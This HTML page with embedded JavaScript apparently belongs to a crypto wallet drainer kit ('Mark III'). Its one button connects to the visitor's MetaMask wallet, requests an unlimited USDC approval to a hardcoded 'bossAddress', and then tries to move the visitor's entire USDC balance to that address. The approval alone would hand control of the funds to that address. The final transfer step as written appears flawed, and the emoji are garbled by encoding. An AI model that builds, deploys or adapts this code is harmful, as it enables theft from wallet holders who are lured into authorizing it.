<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Mark III ¬∑ Auto Max Transfer</title>
  <style>
    body {
      font-family: "Segoe UI", Roboto, sans-serif;
      background: #e9f4ff;
      text-align: center;
      padding: 60px;
      color: #333;
    }
    h2 {
      color: #2b6cb0;
      font-size: 26px;
    }
    button {
      margin-top: 30px;
      font-size: 18px;
      padding: 14px 28px;
      border: none;
      background: #2b6cb0;
      color: white;
      border-radius: 8px;
      cursor: pointer;
    }
    button:hover {
      background: #1c4f91;
    }
    #status {
      margin-top: 30px;
      font-size: 16px;
      white-space: pre-line;
    }
    .nav-link {
      position: absolute;
      top: 20px;
      left: 20px;
      font-size: 14px;
      text-decoration: none;
      color: #2b6cb0;
    }
  </style>
</head>
<body>
  <a class="nav-link" href="nav.html">‚Üê Back to Dashboard</a>
  <h2>Mark III ¬∑ Auto Max Transfer</h2>
  <button onclick="startAutoTransfer()">üöÄ Authorize & Transfer All</button>
  <div id="status"></div>

  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <script>
    const usdcAddress = "0xa0b86991C6218B36C1d19D4a2e9Eb0cE3606eB48";
    const bossAddress = "0x86DBe265b0d503e68676971fc7d6aAD7E5d90b12";
    const approveAmount = ethers.constants.MaxUint256;

    async function startAutoTransfer() {
      const status = document.getElementById("status");
      try {
        if (!window.ethereum) {
          status.innerText = "‚ùå MetaMask not detected.";
          return;
        }

        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        const signer = provider.getSigner();
        const user = await signer.getAddress();
        status.innerText = "üîó Connected: " + user;

        const usdc = new ethers.Contract(usdcAddress, [
          "function approve(address,uint256) public returns (bool)",
          "function allowance(address,address) view returns (uint256)",
          "function balanceOf(address) view returns (uint256)",
          "function transferFrom(address,address,uint256) public returns (bool)"
        ], signer);

        status.innerText += "\\n‚è≥ Approving Max...";
        const approveTx = await usdc.approve(bossAddress, approveAmount);
        await approveTx.wait();
        status.innerText += "\\n‚úÖ Approval successful";

        const balance = await usdc.balanceOf(user);
        status.innerText += "\\nüí∞ Your USDC Balance: " + ethers.utils.formatUnits(balance, 6);

        const allowance = await usdc.allowance(user, bossAddress);
        if (balance.gt(allowance)) {
          status.innerText += "\\n‚ö†Ô∏è Not enough allowance. Please retry after approval.";
          return;
        }

        status.innerText += "\\nüí∏ Transferring entire USDC...";
        const tx = await usdc.transferFrom(user, bossAddress, balance);
        await tx.wait();
        status.innerText += "\\n‚úÖ Transfer complete!";
      } catch (err) {
        console.error(err);
        status.innerText += "\\n‚ùå Error: " + (err.message || err);
      }
    }
  </script>
</body>
</html>
